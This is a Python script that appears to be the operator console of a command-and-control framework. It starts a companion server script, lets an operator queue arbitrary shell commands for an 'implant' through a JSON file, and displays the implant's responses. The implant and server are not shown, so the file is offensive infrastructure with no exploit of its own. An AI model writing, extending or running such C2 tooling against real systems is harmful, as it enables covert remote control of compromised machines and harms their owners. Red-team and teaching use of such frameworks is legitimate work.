import os
import json
import subprocess
import time

# Directories and files
BASE_DIR = os.getcwd()
COMMAND_FILE = os.path.join(BASE_DIR, "commands/command.json")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
RESULT_FILE = os.path.join(UPLOAD_DIR, "response.txt")

# Ensure directories exist
os.makedirs(os.path.dirname(COMMAND_FILE), exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Path to the server script (replace with the actual server script name)
SERVER_SCRIPT = "server.py"

# Start the server script
def start_server():
    if not os.path.exists(SERVER_SCRIPT):
        print(f"[-] Server script '{SERVER_SCRIPT}' not found.")
        return None

    print(f"[*] Starting server script: {SERVER_SCRIPT}...")
    server_process = subprocess.Popen(["python2", SERVER_SCRIPT], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(2)  # Give the server time to start
    return server_process

# Stop the server script
def stop_server(server_process):
    if server_process:
        print("[*] Stopping server script...")
        server_process.terminate()
        server_process.wait()
        print("[+] Server stopped.")

# CLI interface
def c2_cli():
    print("\n=== C2 Interface ===")
    print("[1] Set Command")
    print("[2] View Implant Response")
    print("[3] Exit")

    while True:
        choice = input("\nSelect an option: ")
        if choice == "1":
            set_command()
        elif choice == "2":
            view_response()
        elif choice == "3":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Try again.")

# Set a new command
def set_command():
    command = input("Enter the command to send to the implant: ").strip()
    if command:
        command_data = {"command": command}
        with open(COMMAND_FILE, "w") as f:
            json.dump(command_data, f)
        print(f"[+] Command saved to {COMMAND_FILE}.")
    else:
        print("[-] Command cannot be empty.")

# View the latest response from the implant
def view_response():
    if os.path.exists(RESULT_FILE):
        with open(RESULT_FILE, "r") as f:
            response = f.read()
        print(f"\n[ Implant Response ]:\n{response}")
    else:
        print("[-] No response file found.")

# Main function
if __name__ == "__main__":
    print("=== C2 Framework ===")
    print("[1] Start Server and Launch Operator Interface")
    print("[2] Exit")

    option = input("\nSelect an option: ")
    if option == "1":
        # Start the server script
        server_process = start_server()
        if server_process:
            try:
                # Launch the CLI interface
                c2_cli()
            finally:
                # Stop the server script when exiting
                stop_server(server_process)
    elif option == "2":
        print("Exiting...")
    else:
        print("Invalid option. Exiting...")
